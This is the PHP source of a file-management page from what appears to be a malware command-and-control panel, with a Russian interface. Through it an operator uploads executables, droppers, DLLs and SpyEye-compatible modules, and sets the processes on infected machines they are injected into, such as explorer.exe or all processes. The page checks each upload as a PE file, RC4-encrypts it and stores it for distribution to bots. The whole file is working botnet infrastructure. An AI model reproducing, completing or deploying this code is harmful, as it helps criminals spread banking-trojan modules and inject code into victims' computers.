<?php

echo "<div style='padding: 20px'><div style='margin-bottom: 20px'>
    <a	class='razdel' href='?act=files'>Список</a>
    <a	class='razdel' href='?act=files&add'>Добавить</a>
    </div>";

if (isset($_GET['del']))
{
	$id = intval($_GET['del']);
    
	$file = $db->query("SELECT `fFilePath` FROM `files` WHERE fId={$id}")->fetchArray();
	if($file) 
	{
		unlink("{$file[0]}");
		$db->query("DELETE FROM `files` WHERE fId={$id} LIMIT 1");
	}
}

if (!isset($_GET['add']))
{
    $files = $db->query('SELECT * FROM `files`')->fetchAllAssoc();

    echo "<table cellpadding='3' cellspacing='3' width='100%' style=''><tr><td width='100%'>";

    echo "<table cellpadding='3' cellspacing='0' width='100%' class='light_table box' rules='all'>
    <tr><th>Номер</th><th>Имя</th><th>Версия</th><th>Инжект</th><th>Связан с модулем</th><th>Аргументы</th><th>Добавлен</th><th>Путь</th><th>Действие</th></tr>";

    $count = 0;

    foreach ($files as $file)
    {
        $color = $count % 2 ? "#d3e7f0" : "#ebf4f8";
        
        echo "<tr bgcolor='$color' onmouseover=\"this.style.background='#ffffff'\" onmouseout=\"this.style.background='$color'\">
        <td align='center'><b>{$file['fId']}</b></td>
        <td align='center'>{$file['fName']} <small><i>{$file['fArch']}</i></small></td>
        <td align='center'>{$file['fVer']}</td>
        <td align='center'>{$file['fInject']}</td>
		<td align='center'>{$file['fConnectedWith']}</td>
		<td align='center'>{$file['fArgs']}</td>
        <td align='center'>{$file['fDate']}</td>
        <td align='center'>{$file['fFilePath']}</td>
        <td align='center'><a href='?act=files&del=".$file['fId']."'>Удалить</a></td>
        </tr>";

        $count++;
    }
}
else
{
	echo "<form class='formee' action='?act=files&add' method='post' enctype='multipart/form-data'>
        <table cellpadding='3' cellspacing='3' width='100%'>
		<tr>
            <td class='td_col_zag' width='40%'>Что хотите добавлять?</td>
            <td class='td_col_list' width='60%'>
					<select style='width: 300px;' id='type-selector' onchange='fileadd_show_options(this.selectedIndex);'>
						<option value='0'>Exe</option>
						<option value='1'>Exe дроппера</option>
						<option value='2'>Dll</option>
						<option value='3'>Спец. Модуль(*)</option>
					</select>
            </td>
        </tr>
		
        <tr>
            <td class='td_col_zag' width='40%'>Имя</td>
            <td class='td_col_list' width='60%'>
                <input style='width: 300px;' name='fName' type='text' value=''>
            </td>
        </tr>
        <tr id='fileversion' style='display: none;'>
            <td class='td_col_zag' width='40%'>Версия</td>
            <td class='td_col_list' width='60%'>
                <input style='width: 300px;' name='fVer' type='text' value=''>
            </td>
        </tr>
		<tr id='connectedwith' style='display: none;'>
            <td class='td_col_zag' width='40%'>Связан с модулем (диспетер таблиц)</td>
            <td class='td_col_list' width='60%'>
                <select style='width: 300px;' name='tConnectedWith'><option value='none'>Не связан</option>";
		$files = $db -> query('SELECT * FROM `files`') -> fetchAllAssoc();
		foreach ($files as $file)
		{
		    echo "<option value='".$file['fName']."'>".$file['fName']."</option>";
		}
	echo "</select>
            </td>
        </tr>
		<tr id='arguments' style='display: none;'>
            <td class='td_col_zag' width='40%'>Аргументы (SpyEye Init)<br><small>Параметры, которые будут переданы модулю</small></td>
            <td class='td_col_list' width='60%'>
                <input style='width: 300px;' name='fArgs' type='text' value='empty' onfocus=\"if (this.value==this.defaultValue) this.value = ''\" onblur=\"if (this.value=='') this.value = this.defaultValue\" size=40>
            </td>
        </tr>
        <tr id='wheretoinject' style='display: none;'>
            <td class='td_col_zag' width='40%'>Куда внедрять если модуль<br><small>* - во все процессы<br>explorer.exe - имя процесса</small></td>
            <td class='td_col_list' width='60%'>
                <input name='fInject' type='text' value='' size='40' style='width: 300px;'>
            </td>
        </tr>
        <tr>
            <td class='td_col_zag' width='40%'>Файл</td>
            <td class='td_col_list' width='60%'>
                <input type='file' name='fFile' style='width: 300px;'>
            </td>
        </tr>
        <tr>
            <td>&nbsp;</td>
            <td><input type='submit' value='Добавить' name='fAdd'></td>
        </tr>
        </table>
        </form><br>
		<i><small>Спец. Модуль(*) « Полностью совместимый с типом модулей SpyEye, модифицированный.</small></i>";

    if (isset($_POST['fAdd']))
    {
        $newname = './files/'.randstr(30);
        $ctx = file_get_contents($_FILES['fFile']['tmp_name']);
		
		$arr = unpack('v1doshdr/@60/Llfa_new/C*bytes', $ctx);
		if($arr['doshdr'] == 23117) //0x5A4D
		{
			$fileheader[0] = $arr['bytes'.($arr['lfa_new'] - 59)];
			$fileheader[1] = $arr['bytes'.($arr['lfa_new'] - 58)];
			if($fileheader[0] == 76 && $fileheader[1] == 1) $PEarch = "X86";
			else if($fileheader[0] == 100 && $fileheader[1] == 134) $PEarch = "X64";
			if (!empty($PEarch) && ($fh = fopen($newname, "w+")))
			{
				if (fwrite($fh, RC4($ctx, explode('/',$newname)[2])))
				{
					
					$file = array
						(
							'fArch' => $PEarch,
							'fName' => $_POST['fName'],
							'fVer' => $_POST['fVer'],
							'fInject' => $_POST['fInject'],
							'fFilePath' => $newname,
							'fDate' => date('Y-m-d H:i:s', strtotime('now')),
							'fConnectedWith' => $_POST['tConnectedWith'],
							'fArgs' => $_POST['fArgs'],
						);

					if ($db->insert('files', $file)) metaRefresh('?act=files');
				}
				else echo "Error while write file";
				
				fclose($fh);
			}
			else echo "Error while open file or file is not valid PE image.";
			unset($arr);
		}
		else echo "Not a PE file.";
    }
}

?>
